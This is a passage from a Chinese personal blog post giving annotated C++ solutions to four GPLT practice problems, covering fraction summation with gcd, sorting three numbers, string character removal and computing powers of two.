<p>![img](file:///C:\Users\YCNN\Documents\Tencent Files\1187691781\Image\C2C\9CFF06029FD196D5E19F7D9FF8F6B771.png)</p>
<p>然后计算结果分子分母的最大公约数，然后相除，得到最简分数</p>
<p>这里需要考虑的地方：</p>
<ol>
<li>分母小于0 =&gt; 把符号换到分子上去</li>
<li>分子小于0，说明为0，为了方便后期的计算，将分母置为0，防止该数的影响</li>
</ol>
<p>最后，根据能否整除，输出不同的结果。</p>
</blockquote>
<h3 id="scanf输入"><a href="#scanf输入" class="headerlink" title="scanf输入"></a>scanf输入</h3><p>这里使用scanf输入，，因为知道两个数字中间一定有一个/，可以简化，，，不用特意接受字符’/‘</p>
<h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>固定格式：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beauty</span><span class="params">(<span class="keyword">int</span> &amp;a1,<span class="keyword">int</span> &amp;b1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        a1 = -a1;</span><br><span class="line">        b1 = -b1;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == <span class="number">0</span>)&#123;</span><br><span class="line">        b1 = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> simple = gcd(<span class="built_in">abs</span>(a1),<span class="built_in">abs</span>(b1));</span><br><span class="line">        a1 /= simple;</span><br><span class="line">        b1 /= simple;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> a1,b1,a2,b2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a1,&amp;b1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a2,&amp;b2);</span><br><span class="line">        a1 = a1 * b2 + a2 * b1;</span><br><span class="line">        b1 = b1 * b2;</span><br><span class="line">        beauty(a1,b1);</span><br><span class="line">    &#125;</span><br><span class="line">    beauty(a1,b1);<span class="comment">//如果只有一个式子，不会进入循环，，，但是输入可能不是最简的</span></span><br><span class="line">    <span class="keyword">if</span>(b1 == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 &lt; b1)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1/b1&lt;&lt;<span class="string">" "</span>&lt;&lt;a1 % b1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="L1-010-比较大小"><a href="#L1-010-比较大小" class="headerlink" title="L1-010 比较大小"></a>L1-010 比较大小</h2><blockquote>
<p>只是对三个数排序，，，非常简单</p>
</blockquote>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>头文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr,arr+<span class="number">3</span>);<span class="comment">//arr是数组名，3是arr的长度</span></span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>]&gt;&gt;arr[<span class="number">1</span>]&gt;&gt;arr[<span class="number">2</span>];</span><br><span class="line">    sort(arr,arr+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">1</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="L1-011-A-B"><a href="#L1-011-A-B" class="headerlink" title="L1-011 A-B"></a>L1-011 A-B</h2><blockquote>
<p><del>本来是用eclipse的replace做的，但是超时了，，，555</del></p>
<p><img src="/2021/03/19/%E5%9B%A2%E4%BD%93%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E7%BB%83%E4%B9%A0%E9%9B%86/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319201138492.png" alt="image-20210319201138492"></p>
<p>正确的思路：</p>
<p>遍历第二个字符串，用长度为256（ascii表长度）的数组记录又那些出现过的字符，最后再对第一个字符串遍历，根据数组是否出现过，，，。这里数组的存储的index就是字符串的ascii码【这点比较interesting】</p>
</blockquote>
<h3 id="c-输入一行"><a href="#c-输入一行" class="headerlink" title="c++输入一行"></a>c++输入一行</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getline(<span class="built_in">cin</span>,a);</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> mark[<span class="number">256</span>];</span><br><span class="line">    getline(<span class="built_in">cin</span>,a);</span><br><span class="line">    getline(<span class="built_in">cin</span>,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.length() ; ++i) &#123;</span><br><span class="line">        mark[b[i]] = <span class="number">1</span>;<span class="comment">//直接将字符串的ascii码作为数组下表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.length() ; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mark[a[j]] == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="L1-012-计算指数"><a href="#L1-012-计算指数" class="headerlink" title="L1-012 计算指数"></a>L1-012 计算指数</h2><blockquote>
<p>pow（底数，幂次）的结果是double型的，，，，不知道为什么不能强转到int，，，</p>
<p>就输出是f了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2^%d = %.f"</span>,n,<span class="built_in">pow</span>(<span class="number">2</span>,n));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/03/19/团体程序设计天梯赛-练习集/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/2/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/4/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/advanced-pwn/">advanced pwn<span>1</span></a></li>
		
			<li><a href="/categories/blockchain/">blockchain<span>1</span></a></li>
		
			<li><a href="/categories/book/">book<span>1</span></a></li>
		
			<li><a href="/categories/buu/">buu<span>13</span></a></li>
		
			<li><a href="/categories/chrome/">chrome<span>1</span></a></li>
		
			<li><a href="/categories/ida/">ida<span>1</span></a></li>
		
			<li><a href="/categories/iot/">iot<span>2</span></a></li>
		
			<li><a href="/categories/pwn/">pwn<span>6</span></a></li>
		
			<li><a href="/categories/reverse/">reverse<span>1</span></a></li>
		
			<li><a href="/categories/v8/">v8<span>1</span></a></li>
		
			<li><a href="/categories/专题/">专题<span>3</span></a></li>
		
			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
		
			<li><a href="/categories/复现/">复现<span>2</span></a></li>
		
			<li><a href="/categories/工具/">工具<span>1</span></a></li>
		
			<li><a href="/categories/常用软件/">常用软件<span>1</span></a></li>
		
			<li><a href="/categories/总结/">总结<span>1</span></a></li>
		
			<li><a href="/categories/算法/">算法<span>9</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
		
			<li><a href="/tags/推免/">推免<span>1</span></a></li>
		
			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
		
			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
		
			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
		
			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
		
			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
		
			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
		
			<li><a href="/tags/《操作系统真相还原》/">《操作系统真相还原》<span>1</span></a></li>
		
			<li><a href="/tags/unsortedbin-attack/">unsortedbin attack<span>1</span></a></li>
		
			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
		
			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
		
			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
		
			<li><a href="/tags/安装/">安装<span>1</span></a></li>
		
			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
		
			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
		
			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
		
			<li><a href="/tags/buu刷题/">buu刷题<span>4</span></a></li>
		
			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
		
			<li><a href="/tags/dasctf/">dasctf<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>35</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/10/21/心路历程/" ><i class="fa fa-file-o"></i>心路历程</a>
      </li>
    
      <li>
        <a href="/2021/10/14/2021推免总结/" ><i class="fa fa-file-o"></i>2021推免总结</a>
      </li>
    
      <li>
        <a href="/2021/10/08/rsa算法/" ><i class="fa fa-file-o"></i>rsa算法</a>
      </li>
    
      <li>
        <a href="/2021/08/26/leetcode之算法学习计划/" ><i class="fa fa-file-o"></i>leetcode之算法学习计划</a>
      </li>
    
      <li>
        <a href="/2021/08/07/LearnBlockchainbyBuildingOne/" ><i class="fa fa-file-o"></i>Learn Blockchain by Buildin...</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="https://github.com/wzpan/hexo-theme-freemind" title="Freemind's Github repository." target="_blank"]);">Freemind</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/kristopolous/BOOTSTRA.386" title="BOOTSTRA.386's Github repository." target="_blank"]);">BOOTSTRA.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/blackshow/hexo-theme-freemind.386" title="Freemind.386's Github repository." target="_blank"]);">Freemind.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/blackshow" title="My Github account." target="_blank"]);">My Github</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2021 winter
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
